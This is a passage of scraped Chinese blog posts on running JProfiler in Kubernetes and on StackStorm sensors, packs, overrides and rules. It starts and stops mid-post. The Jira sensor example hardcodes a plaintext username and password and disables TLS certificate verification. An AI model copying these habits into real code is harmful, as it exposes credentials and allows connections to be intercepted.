\\ \u0026amp;\u0026amp; tar -xzf ${JPROFILER_DISTRO} \\ \u0026amp;\u0026amp; rm -f ${JPROFILER_DISTRO} \\ # Eliminate the version-specific directory \u0026amp;\u0026amp; cp -R */* ${HOME} \\ \u0026amp;\u0026amp; rm -Rf ${STAGING_DIR} \\ \u0026amp;\u0026amp; chmod -R 0775 ${HOME} \\ \u0026amp;\u0026amp; yum clean all # chown and switch user as needed WORKDIR ${HOME} 与业务Pod配置 更改应用程序的部署配置如下：\n如果尚未定义，请在 “spec.template.spec” 下添加 “volumes” 部分并定义一个新卷： volumes: - name: jprofiler-share-tmp emptyDir: {} 如果尚未定义，请在“spec.template.spec” 下添加 “initContainers”（Kubernetes 1.6+），并使用 JProfiler 的镜像定义 Init Container 将 Init container 中的文件复制到共享目录\ninitContainers: - name: jprofiler-init image: \u0026lt;JPROFILER_IMAGE:TAG\u0026gt; command: [\u0026quot;/bin/sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;cp -R /jprofiler/ /tmp/\u0026quot;] volumeMounts: - name: jprofiler mountPath: \u0026quot;/tmp/jprofiler\u0026quot; 将 jprofiler-agent 添加到 JVM 启动参数。\n-agentpath:/jprofiler/bin/linux-x64/libjprofilerti.so=port=8849 完整的Deployment 示例\napiVersion: apps/v1 kind: Deployment metadata: name: jprofiler-test spec: replicas: 1 selector: matchLabels: app: jprofiler template: metadata: labels: app: jprofiler spec: volumes: - name: jprofiler-share-tmp emptyDir: {} shareProcessNamespace: true initContainers: - name: jprofiler-init image: jprofiler:14_0 command: [\u0026quot;/bin/sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;cp -R /jprofiler/ /tmp/\u0026quot;] volumeMounts: - name: jprofiler-share-tmp mountPath: \u0026quot;/tmp\u0026quot; containers: - name: sprintboot-test image:javaweb:3 imagePullPolicy: IfNotPresent volumeMounts: - name: jprofiler-share-tmp mountPath: /tmp env: - name: JAVA_OPTS # nowait 表示启动时不需要手动确认，如果不加会stuck到 jprofiler，使得业务容器不能启动 # -agentpath 必须加到java参数后，而不是 java -jar xxx -agentpath 这样 value: \u0026quot;-agentpath:/tmp/jprofiler/jprofiler14.0/bin/linux-x64/libjprofilerti.so=port=8849,nowait\u0026quot; command: - \u0026quot;java\u0026quot; - \u0026quot;-jar\u0026quot; - demo-0.0.1-SNAPSHOT.jar args: - --server.port=8085 ","permalink":"https://www.oomkill.com/2023/12/stackstorm-rules/","summary":"","title":"kubernetes上jprofiler自动映射 - 项目设计"},{"content":"什么是传感器 传感器 (Sensor) 是将外部系统和事件与 StackStorm 集成的一种方式。传感器是 Python 代码片段，它们要么定期轮询某些外部系统，要么被动等待入站事件，通常示例用于每隔一段时间去轮询某一个对象，然后他们将 Trigger 注入 StackStorm，可以通过规则进行匹配，以执行潜在的 Action。\nSensor 是用 Python 编写的，并且必须遵循 StackStorm 定义的传感器接口要求。\n什么是触发器 触发器 (Trigger) 是 StackStorm 中用于识别 StackStorm 的传入事件。Trigger 是类型（字符串）和可选参数（对象）的元组。编写 Rule 是为了与 Trigger 一起使用。Sensor 通常会记录 Trigger，但这并不是严格要求的。例如，有一个向 StackStorm 注册的通用Webhooks触发器，它不需要自定义传感器。\nStackstorm内置触发器 默认情况下，StackStorm 会发出一些内部 Trigger，您可以在规则中利用它们。这些触发器可以与非系统触发器区分开来，因为它们的前缀为 “st2”。\n下面包含每个资源的可用 Trigger 列表：\nAction\nReference Description Properties core.st2.generic.actiontrigger 封装 Action 执行完成的触发器 execution_id, status, start_timestamp, action_name, action_ref, runner_ref, parameters, result core.st2.generic.notifytrigger 通知触发器 execution_id, status, start_timestamp, end_timestamp, action_ref, runner_ref, channel, route, message, data core.st2.action.file_written 触发封装 Action，将文件写入磁盘 ref, file_path, host_info core.st2.generic.inquiry 触发器指示一个新的查询，表示已经进入 “pending” 状态 id, route Sensor\nReference Description Properties core.st2.sensor.process_spawn 触发器去指示传感器，进程开始启动 object core.st2.sensor.process_exit 触发器指示传感器，进程已经结束 object 如何创建一个 Sensor 创建传感器涉及编写 Python 脚本和定义 Sensor 的 YAML 元数据文件。以下是一个最小化 sensor 的结构示例。\n元数据文件：\n--- class_name: \u0026quot;SampleSensor\u0026quot; entry_point: \u0026quot;sample_sensor.py\u0026quot; description: \u0026quot;Sample sensor that emits triggers.\u0026quot; trigger_types: - name: \u0026quot;event\u0026quot; description: \u0026quot;An example trigger.\u0026quot; payload_schema: type: \u0026quot;object\u0026quot; properties: executed_at: type: \u0026quot;string\u0026quot; format: \u0026quot;date-time\u0026quot; default: \u0026quot;2014-07-30 05:04:24.578325\u0026quot; 相关 Python 脚本的结构，在脚本中，必须遵循该结构进行编写\n# Copyright 2020 The StackStorm Authors. # Copyright 2019 Extreme Networks, Inc. # # Licensed under the Apache License, Version 2.0 (the \u0026quot;License\u0026quot;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026quot;AS IS\u0026quot; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. from st2reactor.sensor.base import Sensor class SampleSensor(Sensor): \u0026quot;\u0026quot;\u0026quot; * self.sensor_service - provides utilities like - get_logger() - returns logger instance specific to this sensor. - dispatch() for dispatching triggers into the system. * self._config - contains parsed configuration that was specified as config.yaml in the pack. \u0026quot;\u0026quot;\u0026quot; def setup(self): # 该方法系统仅调用一次，可以设置连接外部系统的内容到这里 pass def run(self): # 该方法是 sensor 运行的方法 # 这由系统调用一次。 #（如果您想定期睡觉并保持与外部系统交互，您将从 PollingSensor 继承。） # 例如：例如，个简单的flask应用程序。您可以在此处运行 Flask 应用程序。 # 您可以使用sensor_service 调度触发器，如下所示： # 您可以将触发器称为dict # { \u0026quot;name\u0026quot;: ${trigger_name}, \u0026quot;pack\u0026quot;: ${trigger_pack} } # 或者只是简单地作为字符串引用。 # i.e. dispatch(${trigger_pack}.${trigger_name}, payload) # E.g.: dispatch('examples.foo_sensor', {'k1': 'stuff', 'k2': 'foo'}) # trace_tag 是想要与dispatch的 TriggerInstance 关联的标签， # 通常，trace_tag 是唯一的并且是对外部事件的引用。 pass def cleanup(self): # 当 st2 系统宕机时调用此函数。您可以执行清理操作，例如 # 在此关闭与外部系统的连接。 pass def add_trigger(self, trigger): # 当创建触发器时调用此方法 pass def update_trigger(self, trigger): # 当触发器更新时调用此方法 pass def remove_trigger(self, trigger): # 删除触发器时调用此方法 pass 上述是一个最简单的 Sensor 示例。\n您的 Sensor 应生成 Python 字典形式的Trigger：\ntrigger = 'pack.name' payload = { 'executed_at': '2014-08-01T00:00:00.000000Z' } trace_tag = external_event_id Sensor 通过使用实例化时传递到 Sensor 的 sensor_service 来注入此类 Trigger。\nself.sensor_service.dispatch(trigger=trigger, payload=payload, trace_tag=trace_tag) 如果您想要一个定期轮询外部系统的传感器，您可以使用 PollingSensor 而不是 Sensor 作为基类。\n# Copyright 2020 The StackStorm Authors. # Copyright 2019 Extreme Networks, Inc. # # Licensed under the Apache License, Version 2.0 (the \u0026quot;License\u0026quot;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026quot;AS IS\u0026quot; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # 这里引入的是 PollingSensor，而不是Sensor from st2reactor.sensor.base import PollingSensor class SamplePollingSensor(PollingSensor): \u0026quot;\u0026quot;\u0026quot; * self.sensor_service - provides utilities like get_logger() for writing to logs. dispatch() for dispatching triggers into the system. * self._config - contains configuration that was specified as config.yaml in the pack. * self._poll_interval - indicates the interval between two successive poll() calls. \u0026quot;\u0026quot;\u0026quot; def setup(self): # Setup stuff goes here. For example, you might establish connections # to external system once and reuse it. This is called only once by the system. pass def poll(self): # 该方法是 sensor 运行的方法 # 这由系统在每个周期与性能一次，self._poll_interval。 # 例如：假设您想要查询 ec2 并获取有关实例的运行状况信息： some_data = aws_client.get('') payload = self._to_payload(some_data) # _to_triggers 是您编写的用于将数据格式转换为标准 python 字典的东西。 # 这应该遵循为 Trigger 注册的有效负载架构。 self.sensor_service.dispatch(trigger, payload) # 您可以将触发器称为 dict dict = { \u0026quot;name\u0026quot;: \u0026quot;${trigger_name}\u0026quot;, \u0026quot;pack\u0026quot;: \u0026quot;${trigger_pack}\u0026quot; } # 或者简单引用一个字符串，i.e. dispatch(${trigger_pack}.${trigger_name}, payload) # 再例如 dispatch('examples.foo_sensor', {'k1': 'stuff', 'k2': 'foo'}) # trace_tag 是想要与dispatch的 TriggerInstance 关联的标签， # 通常，trace_tag 是唯一的并且是对外部事件的引用。 pass def cleanup(self): # 当 st2 系统宕机时调用此函数。您可以执行清理操作，例如 # 在此关闭与外部系统的连接。 pass def add_trigger(self, trigger): # 当创建触发器时调用此方法 pass def update_trigger(self, trigger): # 当触发器更新时调用此方法 pass def remove_trigger(self, trigger): # 删除触发器时调用此方法 pass 上述是一个 Poll Sensor 代码部分是结构的，setup 是装载时执行，poll 是在每个 interval 执行探测，这里的机制是当完成了派发后是不会第二次派发，这里做法是维护了一个列表到类中。\n例如\naa2233 ACG-3612 {'ACG-3612': \u0026lt;JIRA Issue: key='ACG-3612', id='212268'\u0026gt;} 注：轮询传感器 (Polling Sensors) 还需要元数据文件中的 poll_interval 参数。这定义了调用 poll() 方法的频率（以秒为单位）。\nSersor如何运行 每个传感器作为单独的进程运行。 st2sensorcontainer 启动 sensor_wrapper.py ，它将您的 Sensor 类（例如上面的SampleSensor 或 SamplePollingSenso r）包装在 st2reactor.container.sensor_wrapper.SensorWrapper 中。\nSensor Service 正如您在上面的示例中看到的，sensor_service 在实例化时被传递给每个传感器类构造函数。\n传感器服务 (Sensor Service) 通过公共方法向 Sensor 提供不同的服务。最重要的一种 dispatch 方法是允许 Sensor 将 Trigger 注入系统的方法。所有公共方法描述如下：\n常用操作，Common Operations 数据存储管理操作 Datastore Management Operations Common Operations dispatch 调度：此方法允许传感器将触发器注入系统\ndispatch(trigger, payload, trace_tag) 例如：\ntrigger = 'pack.name' payload = { 'executed_at': '2014-08-01T00:00:00.000000Z' } trace_tag = uuid.uuid4().hex self.sensor_service.dispatch(trigger=trigger, payload=payload, trace_tag=trace_tag) get_logger 此方法允许 Sensor 实例检索特定于该传感器的记录器实例。\nget_logger(name) 例如：\nself._logger = self.sensor_service.get_logger(name=self.__class__.__name__) self._logger.debug('Polling 3rd party system for information') Datastore Management Operations 除了触发器注入之外，传感器服务还提供读取和操作数据存储的功能。\n每个传感器都有一个本地命名空间，默认情况下，所有数据存储操作都对该 Sensor “本地命名空间” 中的键进行操作。如果要对“全局命名空间”进行操作，则需要将参数传递 local=False 给数据存储操作方法。\n除其他原因外，如果想在传感器运行之间保留临时数据，此功能非常有用。\nTwitterSensor 就是此功能的一个很好的例子。 Twitter 传感器在每次轮询后都会在数据存储中保留最后处理的推文的 ID。这样，如果 Trigger 重新启动或崩溃，传感器可以从中断处恢复，而无需向系统注入重复的 Trigger。\nlist_values list_values(local=True, prefix=None) 该方法允许列出数据存储中的值。您还可以通过将 prefix 参数传递给方法来按键名称前缀（键名称开头）进行过滤：\nkvps = self.sensor_service.list_values(local=False, prefix='cmdb.') for kvp in kvps: print(kvp.name) print(kvp.value) get_value get_value(name, local=True, decrypt=False) 此方法允许您从数据存储中检索单个值：\nkvp = self.sensor_service.get_value('cmdb.api_host') print(kvp.name) set_value set_value(name, value, ttl=None, local=True, encrypt=False) 该方法允许在数据存储中存储设置一个值。您还可以选择指定存储值的生存时间 (TTL)：\nlast_id = 12345 self.sensor_service.set_value(name='last_id', value=str(last_id)) Secret 值可以在存储中中加密：\nma_password = 'Sup3rS34et' self.sensor_service.set_value(name='ma_password', value=ma_password, encrypt=True) delete_value delete_value(name, local=True) 该方法允许从存储中删除现有值。如果未找到值，此方法将返回 False，否则返回 True。\nself.sensor_service.delete_value(name='my_key') 定义一个 Sersor 例如我们需要制作一个简单 Sensor 的工作示例，每 60 秒注入一次触发器。\n需要注意的部分：\nSensor 的 Python 的类必需继承 Sensor 或 PollingSensor类，这个由需求而定，必须实现 setup, poll, dispatch等方法\n如有需求，例如变量声明，也可以重写 _init_ 类 setup方法，用于初始化示例需要的数据或状态，例如连接三方系统的配置信息，该方法只执行一次 Sensor runtime 會把实例化并保持运行，按 poll_interval 設置周期去运行 poll 方法 Poll方法是真实执行任务的部分，可在 poll 方法中更新示例持有的数据或状态，判断数据是否匹配，\n然后运行 disptach； 按需派发数据，dispatch方法会派发数据，把数据派发给 _trigger_ref\n_trigger_ref 是 Sensor 设置的 trigger type，也就是 RabbitMQ 的 Queue 名称 元数据定义 --- class_name: \u0026quot;HelloSensor\u0026quot; entry_point: \u0026quot;sensor1.py\u0026quot; description: \u0026quot;Test sensor that emits triggers.\u0026quot; trigger_types: - name: \u0026quot;event1\u0026quot; description: \u0026quot;An example trigger.\u0026quot; payload_schema: type: \u0026quot;object\u0026quot; Python 代码部分 # Copyright 2020 The StackStorm Authors. # Copyright 2019 Extreme Networks, Inc. # # Licensed under the Apache License, Version 2.0 (the \u0026quot;License\u0026quot;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026quot;AS IS\u0026quot; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import eventlet from st2reactor.sensor.base import Sensor class HelloSensor(Sensor): def __init__(self, sensor_service, config): super(HelloSensor, self).__init__(sensor_service=sensor_service, config=config) self._logger = self.sensor_service.get_logger(name=self.__class__.__name__) self._stop = False def setup(self): pass def run(self): while not self._stop: self._logger.debug(\u0026quot;HelloSensor dispatching trigger...\u0026quot;) count = self.sensor_service.get_value(\u0026quot;hello_st2.count\u0026quot;) or 0 payload = {\u0026quot;greeting\u0026quot;: \u0026quot;Yo, StackStorm!\u0026quot;, \u0026quot;count\u0026quot;: int(count) + 1} self.sensor_service.dispatch(trigger=\u0026quot;hello_st2.event1\u0026quot;, payload=payload) self.sensor_service.set_value(\u0026quot;hello_st2.count\u0026quot;, payload[\u0026quot;count\u0026quot;]) eventlet.sleep(60) def cleanup(self): self._stop = True # Methods required for programmable sensors. def add_trigger(self, trigger): pass def update_trigger(self, trigger): pass def remove_trigger(self, trigger): pass Sensor的运行与调试 运行 一旦完成传感器的编写，可以使用以下步骤来首次运行传感器：\n将传感器 Python 文件和 元数据文件 放入 default 包中的 /opt/stackstorm/packs/default/sensors/ ；或者您也可以根据包结构，创建出自定义包并将传感器元件放置在那里 ( /opt/stackstorm/packs/ ) 使用 st2ctl 注册传感器 。注意传感器注册中的任何错误，一旦注册时出现错误，请修复错误并使用 重新注册 。 st2ctl reload --register-all 如果注册成功，传感器将自动运行。 调试 在编写时，很多时候需要调试 Sensor 的运行，而由于环境问题，我们无法做到正常Python程序的调试步骤，必须遵循 Stackstorm 的调试方式。\n如果只想运行包中的单个传感器并且该传感器已注册，则可以使用 st2sensorcontainer 来仅运行该单个传感器：\nsudo /opt/stackstorm/st2/bin/st2sensorcontainer --config-file=/etc/st2/st2.conf --sensor-ref=pack.SensorClassName 例如：\nsudo /opt/stackstorm/st2/bin/st2sensorcontainer --config-file=/etc/st2/st2.conf --sensor-ref=git.GitCommitSensor 示例：Jira服务台 # See ./requirements.txt for requirements. import os import urllib3 import json from jira.client import JIRA from st2reactor.sensor.base import PollingSensor class XinMangSensorForPodMapTicket(PollingSensor): ''' Sensor will monitor for any new projects created in JIRA and emit trigger instance when one is created. ''' def __init__(self, sensor_service, config=None, poll_interval=5): super(XinMangSensorForPodMapTicket, self).__init__(sensor_service=sensor_service, config=config, poll_interval=poll_interval) self._jira_url = None self._config = { \u0026quot;url\u0026quot;: \u0026quot;https://jira.ticket.com\u0026quot;, \u0026quot;auth_method\u0026quot;: \u0026quot;basic\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;jira_automation\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;jira123\u0026quot;, \u0026quot;poll_interval\u0026quot;: 30, \u0026quot;verify\u0026quot;: False } # The Consumer Key created while setting up the \u0026quot;Incoming Authentication\u0026quot; in # JIRA for the Application Link. self._consumer_key = u'' self._rsa_key = None self._jira_client = None self._access_token = u'' self._access_secret = u'' self._projects_available = [\u0026quot;SABP\u0026quot;] self._poll_interval = 30 self._project = \u0026quot;SABP\u0026quot; self._issues_in_project = None self._customer_request_type = \u0026quot;创建Pod映射\u0026quot; self._issue_status = \u0026quot;IN PROGRESS\u0026quot; self._jql_query = None self._trigger_name = 'issues_tracker_for_pod_map_ticket' self._trigger_pack = 'jira' self._trigger_ref = '.'.join([self._trigger_pack, self._trigger_name]) urllib3.disable_warnings() def _read_cert(self, file_path): with open(file_path) as f: return f.read() def setup(self): self._jira_url = self._config['url'] auth_method = self._config['auth_method'] if auth_method == 'oauth': rsa_cert_file = self._config['rsa_cert_file'] if not os.path.exists(rsa_cert_file): raise Exception('Cert file for JIRA OAuth not found at %s.' % rsa_cert_file) self._rsa_key = self._read_cert(rsa_cert_file) self._poll_interval = self._config.get('poll_interval', self._poll_interval) oauth_creds = { 'access_token': self._config['oauth_token'], 'access_token_secret': self._config['oauth_secret'], 'consumer_key': self._config['consumer_key'], 'key_cert': self._rsa_key } self._jira_client = JIRA(options={'server': self._jira_url}, oauth=oauth_creds) elif auth_method == 'basic': basic_creds = (self._config['username'], self._config['password']) self._jira_client = JIRA(options={'server': self._jira_url, 'verify': self._config['verify']},basic_auth=basic_creds) #self._jira_client = JIRA(options={'server': self._jira_url},basic_auth=basic_creds) else: msg = ('You must set auth_method to either \u0026quot;oauth\u0026quot;', 'or \u0026quot;basic\u0026quot; your jira.yaml config file.') raise Exception(msg) self._jql_query = 'project=\u0026quot;%s\u0026quot; and \u0026quot;Customer Request Type\u0026quot;=\u0026quot;%s\u0026quot; and status=\u0026quot;%s\u0026quot;' % (self._project, self._customer_request_type, self._issue_status) all_issues = self._jira_client.search_issues(self._jql_query, maxResults=None) self._issues_in_project = {issue.key: issue for issue in all_issues} def poll(self): self._detect_new_issues() def cleanup(self): pass def add_trigger(self, trigger): pass def update_trigger(self, trigger): pass def remove_trigger(self, trigger): pass def _detect_new_issues(self): new_issues = self._jira_client.search_issues(self._jql_query, maxResults=50, startAt=0) for issue in new_issues: # issue 满足需求的工单 print(self._issues_in_project) # 将服务台任务单保留到这个列表中，保证不会重复派发 if issue.key not in self._issues_in_project: # 记录下未派发的任务，并派发 self._dispatch_issues_trigger(issue) self._issues_in_project[issue.key] = issue def _dispatch_issues_trigger(self, issue): trigger = self._trigger_ref payload = {} payload['project'] = self._project payload['id'] = issue.id payload['expand'] = issue.raw.get('expand', '') payload['issue_key'] = issue.key payload['issue_url'] = issue.self payload['issue_browse_url'] = self._jira_url + '/browse/' + issue.key fields = dict() fields = issue.raw.get('fields', {}) fields_dict = dict() print(fields['customfield_19402'].strip()) fields_dict['pod_name'] = fields['customfield_19401'].strip() fields_dict['start_time'] = fields['customfield_19402'].strip() fields_dict['end_time'] = fields['customfield_19403'].strip() fields_dict['k8s_cluster'] = fields['customfield_19404']['value'] fields_dict['reporter'] = fields['reporter']['key'] payload['fields'] = fields_dict if fields_dict['reporter'] != 'a@gmail.com': self._sensor_service.dispatch(trigger, payload) Reference [1] Sensors and Triggers\n[2] How many do you need? - Argo CD Architectures Explained\n","permalink":"https://www.oomkill.com/2023/12/stackstorm-sensors/","summary":"","title":"StackStorm自动化 - Sensor"},{"content":"什么是包 包 “pack” 是扩展 StackStorm 的集成和自动化的部署单元。通常， pack 是沿着服务或产品边界组织的，例如 AWS、Docker、Sensu 等。 pack 包含Actions、Workflows、Rules、 Sensors和Aliases。StackStorm 内容始终是 pack 的一部分，因此了解如何创建 pack 并使用它们非常重要。\n一些 pack 扩展了 StackStorm 以将其与外部系统集成，例如 AWS，GitHub，JIRA。我们称它们为“集成 pack ”。有些 pack 捕获自动化模式：这类 pack 含特定自动化过程的 workflow, Rule 和 Action - 例如st2 演示 pack 。我们称它们为“自动化 pack ”。这种命名主要是一种约定：StackStorm 本身对两者没有区别。\n任何使用该 pack 所针对的服务的人都可以共享和重用集成 pack 。您可以在StackStorm Exchange找到许多这样的示例。自动化 pack 通常是特定于站点的，并且在特定团队或公司之外几乎没有用处；它们通常在内部共享。\n总结：Packs是StackStorm中组织工作流、动作和传感器的方式。它们是一组相关的动作、工作流和传感器的集合，通常用于实现特定的自动化任务或集成。\n包管理 StackStorm pack 通过命令进行管理：将为您提供有用的概述。st2 pack \u0026lt;...\u0026gt; / st2 pack -h 有些（例如core 基本 StackStorm action）是随 StackStorm 预装的。所有其他 pack 都需要您安装。幸运的是，这很容易！ list和get是获取有关本地 pack 信息的主要命令：\n# List all installed packs st2 pack list # Get detailed information about an installed pack st2 pack get core 使用 StackStorm 和 pack 管理 Action 时，所有 pack 都会安装到系统 pack 目录中，默认为 /opt/stackstorm/packs/.\n除了可以安装本地的包，还可以安装社区维护的包，已有一百多个 StackStorm pack 您可以在 exchange.stackstorm.org 浏览包列表，或通过 CLI 搜索 pack 索引，st2 search 需要联网使用，大部分 stackstorm 包 已经不再更新，使用较多的为 jira, 定时任务，脚本类。\nst2 pack searchst2 pack show # Search query is applied across all pack parameters. # It will search through pack names: st2 pack search sensu # And keywords: st2 pack search monitoring # And description (use quotes for multi-word search): st2 pack search \u0026quot;Amazon Web Services\u0026quot; # And even pack author: st2 pack search \u0026quot;Jon Middleton\u0026quot; # Show an index entry for the pack # with the exact name match st2 pack show sensu 安装包 从 stackstorm 官方仓库安装 stackstorm pack 安装起来很简单\n# Install from the Exchange by pack name st2 pack install sensu # You can also install multiple packs: st2 pack install datadog github 此命令将会从GitHub 上的 StackStorm Exchange 仓库下载包，将它们放在 下/opt/stackstorm/packs，并向 StackStorm 注册它们。\n本质上，用户可以同样轻松地使用名从 git 安装属于自己的包。\n# Install your own pack from git using http(s) st2 pack install https://github.com/emedvedev/chatops_tutorial # Install your own pack from git using ssh st2 pack install git@github.com/emedvedev/chatops_tutorial # Install your own pack using gitlab URL (added in release 3.4) st2 pack install gitlab@gitlab.com:example/examplepack 默认情况下，将安装最新版本的 pack ，但您可以指定特定版本、分支、tag，甚至提交哈希。只需使用下面命令\n# Fetch a specific commit st2 pack install cloudflare=776b9a4 # Or a version tag st2 pack install cloudflare=0.1.0 # Or a branch st2 pack install https://github.com/emedvedev/chatops_tutorial=testing 也可以从现有的本地目录安装 pack ：\n# Install a pack from '/home/stanley/bitcoin' dir st2 pack install file:///home/stanley/bitcoin 需要注意的一点是，从 git 存储库目录安装 pack 将仅安装最新提交，并忽略对文件的任何后续未提交更改。在已安装的 pack 上运行会将其替换为请求的版本，或者如果未指定版本，则升级到最新版本。您的配置文件不会被覆盖，因此您可以轻松恢复到旧版本，但对于生产部署，我们建议始终指定版本，防止 st2 pack install latest\n包依赖 依赖是从 StackStorm 3.2 开始的新功能！\n如果您的包使用其他包中的 Action，您可以在文件 dependencies 的 部分中指定它们 pack.yaml，StackStorm 将在安装您的包时自动安装它们。\n与使用子命令类似，您可以仅使用名称来引用 StackStorm Exchange 中的包，也可以指定包的 Git 存储库 URL。您还可以使用相同的语法来安装特定版本、标签或分支：st2 pack install\ndependencies: - excel - powerpoint=0.2.2 - https://github.com/StackStorm/stackstorm-ms.git 如果存在依赖性冲突，子命令可能会出错，而不会安装任何包。如果您想强制安装包而不安装其依赖项，您可以使用以下标志：\nst2 pack install --skip-dependencies my-custom-pack 包卸载 卸载包使用 st2 pack remove：\nst2 pack remove sensu 配置包 集成一个包（pack）通常需要针对您的环境进行配置。例如，您需要指定 SMTP 服务器以使用电子邮件 pack 、指定 puppet master URL 以使用 Puppet pack ，或者指定 OpenStack 的 Keystone 端点和租户凭证。\n通常大多数需要配置的 pack 都可以交互配置：\nst2 pack config \u0026lt;pack_name\u0026gt; 系统将提示您在交互式工具中输入配置参数，其中包含说明、建议和默认值。在保存之前，您还会被要求在文本编辑器中验证您的最终配置文件；它是可选的，大多数包不需要超过两个或三个字段。生成的文件将被放入 /opt/stackstorm/configs/\u0026lt;pack\u0026gt;.yaml 并加载。\n注意：StackStorm 将 pack 配置加载到 MongoDB 中。当您使用 st2 pack config 时，它会自动加载 。但是如果您手动编辑 pack 配置，或使用配置管理工具来管理这些文件，则必须告诉StackStorm 加载更新的配置。\n更新包配置\nsudo st2ctl reload --register-configs 覆盖包的默认值 安装包时，资源的状态是从包中的元数据文件中获取的。有时，在安装社区包时，您可能不希望启用所有资源，例如您只想使用 Action 的子集，或者想要禁用传感器。\n在 StackStorm 3.7.0 之前，可以通过以下方式更改此状态：\n使用 StackStorm API 禁用资源。然而，在重新安装或包重新安装时，这将被忘记。st2ctl reload 手动更改元数据文件。这将在升级时丢失，并且无法轻易跟踪。 在StackStorm 3.7.0中，我们引入了覆盖功能，以便包资源的元数据可以被配置文件覆盖。这将始终在重新加载或包安装时被读取。 ST2 API 仍然允许您覆盖此设置，但与以前一样，StackStorm API 为启用/禁用资源所做的任何更改在重新加载或重新安装时都会被忘记。\n覆盖工具当前仅限于允许仅针对以下类型的资源覆盖启用的属性：Action、Alias、Rule 和 Sensor。它由目录 /opt/stackstorm/overrides 控制 。\n安装包或重载时，资源状态按如下方式管理：\n状态是从位于 中的包的资源元数据文件中读取的/opt/stackstorm/packs/\u0026lt;packname\u0026gt;。这些是从包的相关存储库下载的，例如 GIT, StackStorm-Exchange。 如果 /opt/stackstorm/overrides/_global.yaml 存在，这回应用这个包的默认值或特定于资源的覆盖。允许 _global.yaml 您指定特定资源类型的默认状态，例如禁用所有 Sensor。 _global.yaml 的格式如下（设置为禁用所有内容）： --- sensors: defaults: enabled: false actions: defaults: enabled: false aliases: defaults: enabled: false rules: defaults: enabled: false 如果发生了覆盖，则受影响的资源数量将在 Output 中输出，例如：st2ctl reload\n$ st2ctl reload --register-all Registering content...[flags = --config-file /etc/st2/st2.conf --register-all] 2022-02-07 12:56:43,694 INFO [-] Connecting to database \u0026quot;st2\u0026quot; @ \u0026quot;127.0.0.1:27017\u0026quot; as user \u0026quot;None\u0026quot;. 2022-02-07 12:56:43,704 INFO [-] Successfully connected to database \u0026quot;st2\u0026quot; @ \u0026quot;127.0.0.1:27017\u0026quot; as user \u0026quot;None\u0026quot;. 2022-02-07 12:56:44,254 INFO [-] ========================================================= 2022-02-07 12:56:44,254 INFO [-] ############## Registering triggers ##################### 2022-02-07 12:56:44,254 INFO [-] ========================================================= 2022-02-07 12:56:44,549 INFO [-] Registered 1 triggers. 2022-02-07 12:56:44,549 INFO [-] ========================================================= 2022-02-07 12:56:44,549 INFO [-] ############## Registering sensors ###################### 2022-02-07 12:56:44,549 INFO [-] ========================================================= 2022-02-07 12:56:44,832 INFO [-] Registered 9 sensors. 2022-02-07 12:56:44,832 INFO [-] 7 sensors had their metadata overridden. 示例：禁用一个包中的所有Sersor 如果要禁用一个包中的所有传感器，我们将创建一个 /opt/stackstorm/overrides/\u0026lt;packname\u0026gt;.yaml 文件，包含以下内容的 sensor：\n--- sensors: defaults: enabled: false 示例：禁用所有包中的所有传感器（排除某个包） 相反，如果我们想覆盖除单个包之外的所有传感器，那么我们将创建一个/opt/stackstorm/overrides/_global.yaml来禁用所有传感器：\n--- sensors: defaults: enabled: false 之后创建 /opt/stackstorm/overrides/\u0026lt;packname\u0026gt;.yaml，为所需的包启用 Sensor\n--- sensors: defaults: enabled: true 示例：禁用包的Action，但排除某些Action --- actions: defaults: enabled: false exceptions: action1: enabled: true action2: enabled: true 示例：禁用包中某一个Rule rules: exceptions: rule1: enabled: false 虚拟环境 在 StackStorm 中，所有包的所有任务都是基于Python虚拟环境运行，以便区隔及管理各个包的Python套件。系统自带包使用系统自带的虚拟环境，位于目录：/opt/stackstorm/st2/\n通常，自建的包则需在/opt/stackstorm/virtualenvs目录下创建跟包同样名称的Python虚拟环境。\n$ tree virtualenvs/ -L 2 virtualenvs/ ├── crontab │ ├── bin │ ├── include │ ├── lib │ ├── lib64 -\u0026gt; lib │ └── pyvenv.cfg ..... 在包运行时，需要提前为包含 Python Action/Sensor 的每个包创建一个 Python 虚拟环境 /opt/stackstorm/virtualenv，Python 依赖将通过 pip -rrequirements.txt 安装在 virtualenv 中，这部分是 Stackstorm 自动处理。\nStackStorm v3.4.0 中删除了对 Python 2 的支持。请考虑更新任何仅适用于 Python 2 的包以与 Python 3 配合使用。\n如果在 offline 环境中，需要创建一个自定义包，那么需要手动创建对应的虚拟环境，例如，在/opt/stackstorm/virtualenvs目录运行下列命令创建包的虚拟环境。也可以使用 ln 命令创建文件连接。x\n$ python -m venv package_name ","permalink":"https://www.oomkill.com/2023/11/stackstorm-pack/","summary":"","title":"StackStorm自动化 - 包"},{"content":"StackStorm 使用 Rules 和 Workflows 来捕获操作模式并进行自动化。rule将 Triggers 映射到 Actions（或 Workflow），应用匹配条件( Criteria)，并将 Triggers payloads 映射到 Actions 的 Input。\n注意\nrule不按预期工作吗？请查看rule故障排除文档。其中介绍了rule测试、检查执行、记录和故障排除等内容。\nRule 的配置结构 stackstorm 中的 Rule 是以 YAML 格式来定义。以下是 Rule 定义结构以及 “必需”和 “可选” rule 元素的列表：\n---\rname: \u0026quot;rule_name\u0026quot; # required\rpack: \u0026quot;examples\u0026quot; # optional\rdescription: \u0026quot;Rule description.\u0026quot; # optional\renabled: true # required\rtrigger: # required\rtype: \u0026quot;trigger_type_ref\u0026quot;\rcriteria: # 